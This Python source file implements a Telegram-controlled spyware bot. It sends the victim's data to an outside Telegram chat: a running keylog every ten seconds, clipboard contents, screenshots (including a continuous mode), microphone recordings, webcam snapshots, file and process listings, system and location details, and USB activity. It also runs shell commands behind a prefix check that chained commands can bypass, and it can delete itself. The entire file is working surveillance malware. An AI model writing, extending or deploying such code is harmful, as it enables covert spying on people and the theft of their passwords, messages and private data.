import os
import socket
import platform
import pyautogui
import requests
import time
import threading
import psutil
import pyperclip
from pynput import keyboard
import telebot
import wave
import sounddevice as sd
import io
from datetime import datetime
import subprocess
import logging
from io import BytesIO
from PIL import Image
import numpy as np
from threading import Lock

from config import BOT_TOKEN, CHAT_ID


# Check for OpenCV availability
try:
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False
    print("Warning: OpenCV not installed. Webcam functionality disabled. Install with 'pip install opencv-python'.")

 
LOG_FILE = 'bot.log'
SAFE_COMMANDS = ['dir', 'ls', 'whoami']
AUDIO_SAMPLE_RATE = 44100
AUDIO_DURATION = 5
MAX_ERRORS = 3
MAX_SCREENSHOT_ATTEMPTS = 3
RETRY_DELAY = 2
MAX_RETRIES = 5

# Logging setup
logging.basicConfig(filename=LOG_FILE, level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Bot instance
bot = telebot.TeleBot(BOT_TOKEN)

# Global state with locks
class BotState:
    def __init__(self):
        self.key_log = ""
        self.key_log_lock = Lock()
        self.current_path = os.path.expanduser("~")
        self.usb_devices = set()
        self.is_monitoring = False
        self.keylogger_listener = None
        self.is_continuous_screenshot = False
        self.screenshot_counter = 0
        self.error_count = {"screenshot": 0, "usb": 0}

state = BotState()

# Utility functions
def format_bold(text):
    """Format text as bold for Telegram."""
    return f"<b>{text}</b>"

def format_code(text):
    """Format text as code for Telegram."""
    return f"<pre>{text}</pre>"

def send_message(text):
    """Send a message to the Telegram chat with error handling."""
    try:
        bot.send_message(CHAT_ID, text, parse_mode='HTML', disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"Error sending message: {e}")

def send_photo(photo, caption=None):
    """Send a photo to the Telegram chat with error handling."""
    try:
        bot.send_photo(CHAT_ID, photo, caption=caption)
    except Exception as e:
        logging.error(f"Error sending photo: {e}")

def send_audio(audio):
    """Send an audio file to the Telegram chat with error handling."""
    try:
        bot.send_audio(CHAT_ID, audio)
    except Exception as e:
        logging.error(f"Error sending audio: {e}")

# System Information
def get_system_info():
    """Retrieve and format system information."""
    try:
        ip_info = requests.get('https://ipinfo.io/json', timeout=5).json()
        cpu_percent = psutil.cpu_percent(interval=0.1)
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        battery = psutil.sensors_battery()

        info = f"""
{format_bold("System Information")}

{format_bold("User:")} {os.getlogin()}
{format_bold("PC Name:")} {socket.gethostname()}
{format_bold("OS:")} {platform.system()} {platform.release()}
{format_bold("CPU:")} {platform.processor()} ({cpu_percent}%)
{format_bold("RAM:")} {round(ram.total / (1024 ** 3), 2)} GB ({ram.percent}%)
{format_bold("Disk (C:):")} {round(disk.total / (1024 ** 3), 2)} GB ({disk.percent}%)
{format_bold("IP:")} {ip_info.get('ip')}
{format_bold("Location:")} {ip_info.get('city')}, {ip_info.get('region')}, {ip_info.get('country')}
{format_bold("Battery:")} {battery.percent if battery else 'N/A'}% ({'Charging' if battery and battery.power_plugged else 'Discharging' if battery else 'N/A'})

{format_bold("Time:")} {datetime.now().strftime('%Y-%m-%d %H:%M:%S IST')}
"""
        return info
    except Exception as e:
        logging.error(f"Error getting system info: {e}")
        return f"Error getting system info: {e}"

def get_system_uptime():
    """Calculate and format system uptime."""
    try:
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        days = int(uptime_seconds // (24 * 3600))
        hours = int((uptime_seconds % (24 * 3600)) // 3600)
        minutes = int((uptime_seconds % 3600) // 60)
        return f"{format_bold('Uptime:')} {days}d {hours}h {minutes}m"
    except Exception as e:
        logging.error(f"Error getting uptime: {e}")
        return f"Error getting uptime: {e}"

def get_network_usage():
    """Retrieve and format network usage statistics."""
    try:
        net_io = psutil.net_io_counters()
        return f"{format_bold('Network Usage:')} Sent: {round(net_io.bytes_sent / (1024 ** 2), 2)} MB, Received: {round(net_io.bytes_recv / (1024 ** 2), 2)} MB"
    except Exception as e:
        logging.error(f"Error getting network usage: {e}")
        return f"Error getting network usage: {e}"

def get_disk_io_stats():
    """Retrieve and format disk I/O statistics."""
    try:
        disk_io = psutil.disk_io_counters()
        return f"{format_bold('Disk I/O:')} Read: {round(disk_io.read_bytes / (1024 ** 2), 2)} MB, Written: {round(disk_io.write_bytes / (1024 ** 2), 2)} MB"
    except Exception as e:
        logging.error(f"Error getting disk I/O stats: {e}")
        return f"Error getting disk I/O stats: {e}"

# Keylogger
def on_press(key):
    """Handle key press events for the keylogger."""
    with state.key_log_lock:
        try:
            state.key_log += f'{key.char}'
        except AttributeError:
            state.key_log += f'[{key}]'

def start_keylogger():
    """Start the keylogger listener."""
    if state.keylogger_listener is None:
        try:
            state.keylogger_listener = keyboard.Listener(on_press=on_press)
            state.keylogger_listener.start()
            return True
        except Exception as e:
            logging.error(f"Error starting keylogger: {e}")
            return False
    return False

def stop_keylogger():
    """Stop the keylogger listener."""
    if state.keylogger_listener is not None:
        try:
            state.keylogger_listener.stop()
            state.keylogger_listener = None
            with state.key_log_lock:
                state.key_log = ""
        except Exception as e:
            logging.error(f"Error stopping keylogger: {e}")

def send_keylog():
    """Send the accumulated keylog to Telegram."""
    with state.key_log_lock:
        if state.key_log:
            send_message(f"Keylog: {format_code(state.key_log)}")
            state.key_log = ""

def keylog_sender_loop():
    """Continuously send keylogs while monitoring."""
    while state.is_monitoring:
        send_keylog()
        time.sleep(10)

# Clipboard
def get_clipboard():
    """Retrieve the current clipboard content."""
    try:
        return pyperclip.paste()
    except Exception as e:
        return f"Could not access clipboard: {e}"

# Screenshot
def send_single_screenshot():
    """Capture and send a single screenshot."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S IST')
    for attempt in range(MAX_SCREENSHOT_ATTEMPTS):
        try:
            if platform.system() == "Linux":
                try:
                    import Xlib.display
                    Xlib.display.Display()
                except Exception as e:
                    raise Exception(f"No display available: {e}")
            pyautogui.FAILSAFE = False
            print(f"Attempting screenshot (Attempt {attempt + 1}/{MAX_SCREENSHOT_ATTEMPTS})...")
            ss = pyautogui.screenshot()
            if ss is None:
                raise ValueError("Screenshot returned None")
            img_buffer = BytesIO()
            ss.save(img_buffer, format="PNG")
            img_buffer.seek(0)
            send_photo(img_buffer, caption=f"Screenshot at {timestamp}")
            state.error_count["screenshot"] = 0
            print("Screenshot successful and sent.")
            return
        except Exception as e:
            print(f"Screenshot attempt {attempt + 1} failed: {e}")
            logging.error(f"Screenshot attempt {attempt + 1} failed: {e}")
            time.sleep(1)
    send_message(f"Failed to capture screenshot after {MAX_SCREENSHOT_ATTEMPTS} attempts.")
    state.error_count["screenshot"] += 1

def continuous_screenshot_loop():
    """Run a loop for continuous screenshots."""
    while state.is_continuous_screenshot and state.is_monitoring:
        try:
            state.screenshot_counter += 1
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S IST')
            send_single_screenshot()
            state.error_count["screenshot"] = 0
            time.sleep(2)
        except Exception as e:
            state.error_count["screenshot"] += 1
            logging.error(f"Continuous screenshot error ({state.error_count['screenshot']}/{MAX_ERRORS}): {e}")
            if state.error_count["screenshot"] >= MAX_ERRORS:
                send_message(f"Continuous screenshots stopped due to repeated errors: {e}")
                state.is_continuous_screenshot = False
                break
            time.sleep(1)
    print("Continuous screenshot loop stopped.")

def handle_continuous_screenshot():
    """Start or manage continuous screenshot mode."""
    if not state.is_continuous_screenshot:
        state.is_continuous_screenshot = True
        threading.Thread(target=continuous_screenshot_loop, daemon=True).start()
        send_message("Starting continuous screenshots. Use 'Stop Continuous' to stop.")
    else:
        send_message("Continuous screenshots are already running.")

def stop_continuous_screenshot():
    """Stop continuous screenshot mode."""
    if state.is_continuous_screenshot:
        state.is_continuous_screenshot = False
        send_message("Continuous screenshots stopped.")
    else:
        send_message("Continuous screenshots are not running.")

# File Explorer
def send_file_explorer():
    """Send the list of files in the current directory."""
    try:
        files = os.listdir(state.current_path)
        files_list = "\n".join(files)
        send_message(f"Files in {state.current_path}: {format_code(files_list)}")
    except Exception as e:
        send_message(f"Error getting file list: {e}")

# Audio Recording
def record_audio():
    """Record and send a short audio clip."""
    try:
        devices = sd.query_devices()
        if not devices:
            raise Exception("No audio devices found.")
        audio_data = sd.rec(int(AUDIO_DURATION * AUDIO_SAMPLE_RATE), samplerate=AUDIO_SAMPLE_RATE, channels=2, dtype='int16')
        sd.wait()
        audio_file = io.BytesIO()
        with wave.open(audio_file, 'wb') as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(AUDIO_SAMPLE_RATE)
            wf.writeframes(audio_data.tobytes())
        audio_file.seek(0)
        send_audio(audio_file)
    except Exception as e:
        send_message(f"Audio Recording Error: {e}")

# USB Detection
def monitor_usb_loop():
    """Monitor for USB device insertions and removals."""
    while state.is_monitoring:
        try:
            current_devices = {dev.device for dev in psutil.disk_partitions(all=False) if 'removable' in dev.opts}
            added = current_devices - state.usb_devices
            removed = state.usb_devices - current_devices

            if added:
                for device in added:
                    send_message(f"New USB device detected: {device}")
            if removed:
                for device in removed:
                    send_message(f"USB device removed: {device}")

            state.usb_devices = current_devices
            state.error_count["usb"] = 0
            time.sleep(2)
        except Exception as e:
            state.error_count["usb"] += 1
            logging.error(f"USB monitoring error ({state.error_count['usb']}/{MAX_ERRORS}): {e}")
            if state.error_count["usb"] >= MAX_ERRORS:
                send_message("USB monitoring stopped due to repeated errors.")
                break
            time.sleep(5)

# Running Processes
def get_running_processes():
    """Retrieve a list of running processes."""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
            processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}, Mem%: {proc.info['memory_percent']:.2f}")
        return "\n".join(processes)
    except Exception as e:
        return f"Error getting running processes: {e}"

def send_running_processes():
    """Send the list of running processes."""
    processes_list = get_running_processes()
    send_message(f"Running Processes: {format_code(processes_list[:4000] + '...' if len(processes_list) > 4000 else processes_list)}")

# Webcam Snapshot
def send_webcam_snapshot():
    """Capture and send a webcam snapshot."""
    if not OPENCV_AVAILABLE:
        send_message("OpenCV not installed. Webcam feature disabled.")
        return
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            send_message("Could not open webcam")
            return
        ret, frame = cap.read()
        if not ret:
            send_message("Could not capture frame")
            cap.release()
            return
        cv2.imwrite("webcam_snapshot.png", frame)
        cap.release()
        with open("webcam_snapshot.png", "rb") as f:
            send_photo(f, caption=f"Webcam Snapshot at {datetime.now().strftime('%Y-%m-%d %H:%M:%S IST')}")
        os.remove("webcam_snapshot.png")
    except Exception as e:
        send_message(f"Webcam Error: {e}")

# Remote Command Execution
def execute_remote_command(command):
    """Execute a safe remote command."""
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=10)
        output = ""
        if stdout:
            output += f"Stdout: {format_code(stdout[:2000])}\n"
        if stderr:
            output += f"Stderr: {format_code(stderr[:2000])}\n"
        send_message(output or f"Command executed: {format_code(command)}")
    except subprocess.TimeoutExpired:
        send_message(f"Command timed out: {format_code(command)}")
    except Exception as e:
        send_message(f"Error executing command: {format_code(command)}\n{format_code(str(e))}")

@bot.message_handler(func=lambda m: m.text.startswith('/exec '))
def handle_exec(msg):
    command = msg.text[6:].strip()
    if any(command.startswith(cmd) for cmd in SAFE_COMMANDS):
        execute_remote_command(command)
    else:
        send_message("Unauthorized command.")

# Menu Handlers
def send_start_menu():
    """Send the start menu keyboard."""
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.row("Start")
    return markup

def send_main_menu():
    """Send the main menu keyboard."""
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("System Info", "Keylogs", "Clipboard", "Processes")
    markup.row("Single Shot", "Continuous", "Stop Continuous", "Files", "Audio", "Webcam")
    markup.row("Uptime", "Network Usage", "Disk I/O", "Stop Monitoring", "Delete Script")
    return markup

@bot.message_handler(commands=['start', 'menu'])
def welcome(msg):
    """Handle the start and menu commands."""
    state.is_monitoring = False
    state.is_continuous_screenshot = False
    send_message("Bot is Ready!")
    bot.send_message(CHAT_ID, "Click 'Start' to begin monitoring.", reply_markup=send_start_menu())

@bot.message_handler(func=lambda m: m.text == "Start")
def handle_start(msg):
    """Start monitoring and related threads."""
    if not state.is_monitoring:
        state.is_monitoring = True
        bot.send_message(CHAT_ID, "Monitoring started!", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.send_message(CHAT_ID, "Available features:", reply_markup=send_main_menu())
        start_monitoring_threads()
    else:
        bot.send_message(CHAT_ID, "Monitoring is already running.", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.send_message(CHAT_ID, "Available features:", reply_markup=send_main_menu())

@bot.message_handler(func=lambda m: m.text == "Stop Monitoring")
def handle_stop(msg):
    """Stop monitoring and cleanup."""
    if state.is_monitoring:
        state.is_monitoring = False
        state.is_continuous_screenshot = False
        stop_keylogger()
        bot.send_message(CHAT_ID, "Monitoring stopped!", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.send_message(CHAT_ID, "Click 'Start' to begin.", reply_markup=send_start_menu())
    else:
        bot.send_message(CHAT_ID, "Monitoring is already stopped.", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.send_message(CHAT_ID, "Click 'Start' to begin.", reply_markup=send_start_menu())

@bot.message_handler(func=lambda m: m.text == "Stop Continuous")
def handle_stop_continuous(msg):
    """Stop continuous screenshot mode."""
    stop_continuous_screenshot()

@bot.message_handler(func=lambda m: True)
def handle_all(msg):
    """Handle all other messages based on monitoring state."""
    if state.is_monitoring:
        text = msg.text
        if text == "System Info":
            send_message(get_system_info())
        elif text == "Keylogs":
            send_keylog()
        elif text == "Clipboard":
            send_message(get_clipboard())
        elif text == "Single Shot":
            send_single_screenshot()
        elif text == "Continuous":
            handle_continuous_screenshot()
        elif text == "Stop Continuous":
            stop_continuous_screenshot()
        elif text == "Files":
            send_file_explorer()
        elif text == "Audio":
            record_audio()
        elif text == "Processes":
            send_running_processes()
        elif text == "Webcam":
            send_webcam_snapshot()
        elif text == "Uptime":
            send_message(get_system_uptime())
        elif text == "Network Usage":
            send_message(get_network_usage())
        elif text == "Disk I/O":
            send_message(get_disk_io_stats())
        elif text == "Delete Script":
            send_message("Attempting to delete script and shut down...")
            try:
                os.remove(__file__)
                send_message("Script deleted successfully. Shutting down.")
                exit(0)
            except Exception as e:
                send_message(f"Error deleting script: {e}. Please delete manually.")
                exit(1)
        else:
            send_message("Unknown command. Use the menu.")
    elif msg.text != "Start":
        send_message("Please click 'Start' to begin monitoring.")

# Main
def start_monitoring_threads():
    """Start all monitoring threads."""
    if state.is_monitoring:
        if start_keylogger():
            threading.Thread(target=keylog_sender_loop, daemon=True).start()
        threading.Thread(target=monitor_usb_loop, daemon=True).start()

if __name__ == "__main__":
    markup = send_start_menu()
    bot.send_message(CHAT_ID, "Bot is Ready!", reply_markup=markup)
    for attempt in range(MAX_RETRIES):
        try:
            bot.polling(none_stop=True)
            break
        except Exception as e:
            logging.error(f"Bot polling error (Attempt {attempt + 1}/{MAX_RETRIES}): {e}")
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (2 ** attempt))
            else:
                send_message("Bot failed to start after multiple attempts.")
                exit(1)